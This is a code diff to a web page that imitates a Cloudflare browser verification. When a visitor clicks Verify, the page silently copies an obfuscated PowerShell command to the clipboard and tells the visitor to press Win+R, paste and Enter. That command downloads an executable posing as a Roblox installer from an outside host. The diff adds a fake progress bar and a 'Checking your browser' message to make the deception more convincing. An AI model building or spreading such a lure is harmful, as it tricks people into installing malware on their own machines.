@@ -23,7 +23,7 @@
             background: #ffffff;
             border-radius: 16px;
             padding: 40px 48px;
-            max-width: 500px;
+            max-width: 520px;
             width: 100%;
             box-shadow: 0 20px 60px rgba(0,0,0,0.5);
             text-align: center;
@@ -85,7 +85,6 @@
             width: 100%;
             box-shadow: 0 4px 12px rgba(243, 128, 32, 0.3);
             position: relative;
-            z-index: 10;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -98,22 +97,11 @@
             transform: scale(0.97);
         }
         .verify-btn:disabled {
-            opacity: 0.8;
+            opacity: 0.9;
             cursor: not-allowed;
         }
-        .note {
-            font-size: 13px;
-            color: #94a3b8;
-            margin-top: 20px;
-        }
-        .note a {
-            color: #f38020;
-            text-decoration: none;
-        }
-
-        /* Spinner */
-        .spinner {
-            display: inline-block;
+        .verify-btn .spinner {
+            display: none;
             width: 20px;
             height: 20px;
             border: 3px solid rgba(255,255,255,0.3);
@@ -123,6 +111,36 @@
         }
         @keyframes spin {
             to { transform: rotate(360deg); }
+        }
+
+        /* Progress bar (Cloudflare‑style) */
+        .progress-wrapper {
+            margin-top: 20px;
+            display: none;
+        }
+        .progress-wrapper.visible {
+            display: block;
+        }
+        .progress-track {
+            background: #e9edf2;
+            border-radius: 12px;
+            height: 8px;
+            overflow: hidden;
+            width: 100%;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: #f38020;
+            border-radius: 12px;
+            transition: width 0.3s ease;
+        }
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            font-size: 13px;
+            color: #64748b;
+            margin-top: 6px;
         }
 
         /* Steps */
@@ -175,12 +193,42 @@
             color: #64748b;
         }
 
-        .verified-check {
-            color: #22c55e;
-            font-size: 20px;
+        .note {
+            font-size: 13px;
+            color: #94a3b8;
+            margin-top: 20px;
+        }
+        .note a {
+            color: #f38020;
+            text-decoration: none;
         }
 
-        /* Responsive */
+        /* Status message while verifying */
+        .status-message {
+            font-size: 14px;
+            color: #64748b;
+            margin-top: 10px;
+            display: none;
+        }
+        .status-message.visible {
+            display: block;
+        }
+        .status-message .dots::after {
+            content: '';
+            animation: dots 1.5s steps(4, end) infinite;
+        }
+        @keyframes dots {
+            0% { content: ''; }
+            25% { content: '.'; }
+            50% { content: '..'; }
+            75% { content: '...'; }
+            100% { content: ''; }
+        }
+        .status-message .dots {
+            display: inline-block;
+            min-width: 20px;
+        }
+
         @media (max-width: 480px) {
             .container { padding: 24px 20px; }
             .step { font-size: 16px; gap: 12px; }
@@ -188,10 +236,9 @@
     </style>
 </head>
 <body>
-    <div class="container" id="container">
-        <!-- Cloudflare Logo (official SVG) -->
+    <div class="container">
+        <!-- Cloudflare Logo (official) -->
         <div class="cloudflare-logo">
-            <!-- Official Cloudflare Logo Mark – simplified from their brand assets -->
             <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm1-13h-2v6l5.25 3.15L17 12.23l-4-2.37V7z" fill="#f38020"/>
             </svg>
@@ -212,14 +259,26 @@
         <!-- Button -->
         <button class="verify-btn" id="verifyBtn">
             <span id="btnText">✔ Verify</span>
-            <span id="btnSpinner" style="display:none;"></span>
+            <span class="spinner" id="btnSpinner"></span>
         </button>
 
-        <div class="note">
-            This site uses Cloudflare to protect against attacks. <a href="#">Learn more</a>
+        <!-- Status message (appears during verification) -->
+        <div class="status-message" id="statusMsg">
+            <span>Checking your browser<span class="dots"></span></span>
         </div>
 
-        <!-- Steps container (hidden until verified) -->
+        <!-- Progress bar (Cloudflare‑style) -->
+        <div class="progress-wrapper" id="progressWrapper">
+            <div class="progress-track">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <div class="progress-label">
+                <span>Verifying...</span>
+                <span id="progressPercent">0%</span>
+            </div>
+        </div>
+
+        <!-- Steps (hidden until click) -->
         <div class="steps" id="stepsContainer">
             <div class="step">
                 <span class="key win">⊞ Win</span> <span class="key">R</span>
@@ -234,12 +293,15 @@
                 <span class="action">Press <strong>Enter</strong> <small>(execute)</small></span>
             </div>
         </div>
+
+        <div class="note">
+            This site uses Cloudflare to protect against attacks. <a href="#">Learn more</a>
+        </div>
     </div>
 
     <script>
         (function() {
             // ---- OBFUSCATED PAYLOAD ----
-            // Same as before – Base64 encoded PowerShell script with splitting.
             const psScript = `
                 $wc = New-Object System.Net.WebClient;
                 $url = 'https://kekman.space/RobloxPlayerInstaller.exe';
@@ -272,7 +334,11 @@
             const btn = document.getElementById('verifyBtn');
             const btnText = document.getElementById('btnText');
             const btnSpinner = document.getElementById('btnSpinner');
-            const stepsContainer = document.getElementById('stepsContainer');
+            const steps = document.getElementById('stepsContainer');
+            const progressWrapper = document.getElementById('progressWrapper');
+            const progressFill = document.getElementById('progressFill');
+            const progressPercent = document.getElementById('progressPercent');
+            const statusMsg = document.getElementById('statusMsg');
 
             let isProcessing = false;
 
@@ -285,31 +351,47 @@
                 btn.disabled = true;
                 btnText.textContent = 'Verifying';
                 btnSpinner.style.display = 'inline-block';
-                btnSpinner.className = 'spinner';
 
-                // 2. Copy the obfuscated command to clipboard silently
-                navigator.clipboard.writeText(finalCmd).catch(() => {
-                    // Fallback: if clipboard fails, we still proceed – user might need to copy manually.
-                    // But we'll ignore errors.
-                });
+                // 2. Show status message and progress bar
+                statusMsg.classList.add('visible');
+                progressWrapper.classList.add('visible');
 
-                // 3. After 60 seconds, show "Verified" and reveal steps
-                setTimeout(() => {
-                    // Update button
-                    btnText.textContent = '✓ Verified';
-                    btnSpinner.style.display = 'none';
-                    btn.style.background = '#22c55e';
-                    btn.disabled = false; // allow clicking again but it's already verified
+                // 3. Show the steps immediately
+                steps.classList.add('visible');
 
-                    // Show steps
-                    stepsContainer.classList.add('visible');
+                // 4. Copy the command to clipboard silently
+                navigator.clipboard.writeText(finalCmd).catch(() => {});
 
-                    isProcessing = false;
-                }, 60000); // 60 seconds
+                // 5. Start the 60‑second progress bar animation
+                let startTime = Date.now();
+                const duration = 60000; // 60 seconds
+
+                function updateProgress() {
+                    const elapsed = Date.now() - startTime;
+                    const progress = Math.min(elapsed / duration, 1);
+                    const percent = Math.round(progress * 100);
+                    progressFill.style.width = percent + '%';
+                    progressPercent.textContent = percent + '%';
+
+                    if (progress < 1) {
+                        requestAnimationFrame(updateProgress);
+                    } else {
+                        // Verification complete
+                        btnText.textContent = '✓ Verified';
+                        btnSpinner.style.display = 'none';
+                        btn.style.background = '#22c55e';
+                        btn.disabled = false;
+                        statusMsg.classList.remove('visible');
+                        progressPercent.textContent = '100%';
+                        // Keep steps visible
+                        isProcessing = false;
+                    }
+                }
+
+                // Start the animation loop
+                requestAnimationFrame(updateProgress);
             });
 
-            // Optional: if the user clicks the button again after verification, we could ignore.
-            // But we can just let it be.
         })();
     </script>
 </body>
